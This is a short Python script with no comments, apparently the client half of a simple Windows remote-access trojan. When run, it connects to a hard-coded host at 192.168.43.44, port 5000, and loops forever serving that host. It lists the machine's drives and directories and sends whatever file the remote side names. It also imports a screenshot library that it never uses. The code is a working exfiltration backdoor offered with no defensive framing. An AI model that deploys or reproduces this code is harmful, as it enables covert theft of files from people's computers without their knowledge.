import socket
import win32api
import pyscreenshot as ImageGrab
import os
import sys
import subprocess


hostAddr = '192.168.43.44'
port = 5000

s = socket.socket()
s.connect((hostAddr,port))

def browse_file():
	str(s.recv(4096),"utf-8")
	drives = win32api.GetLogicalDriveStrings()
	drives = drives.split('\000')[:-1]

	strDrives = ""
	for drive in drives:
		strDrives += drive.replace("\\","") + "\n"

	s.send(str.encode(strDrives))

	strDrive = str(s.recv(1024),"utf-8")
	strDrive = strDrive + "\\"


	files = ""
	if os.path.isdir(strDrive):
		arrfiles = os.listdir(strDrive)

		for file in arrfiles:
			files += file + "\n"
	else:
		s.send(str.encode("Invalid Directory"))


	s.send(str.encode(files))

def transfer_file():
	files = os.listdir('.')

	strFiles =""
	for file in files:
		strFiles+= file + "\n"

	s.send(str.encode(strFiles))

	filename = str(s.recv(1024),"utf-8")
	if os.path.isfile(filename):
		s.send(str.encode(str(os.path.getsize(filename))))
	else:
		s.send(str.encode("Invalid Filename"))

	message = str(s.recv(1024),"utf-8")
	if message=="Y":
		with open(filename,'r') as f:
			Bytes = f.read(1024)
			s.send(Bytes)
			while Bytes != "":
				Bytes = f.read(1024)
				s.send(str.encode(Bytes))	

while True:
	transfer_file()	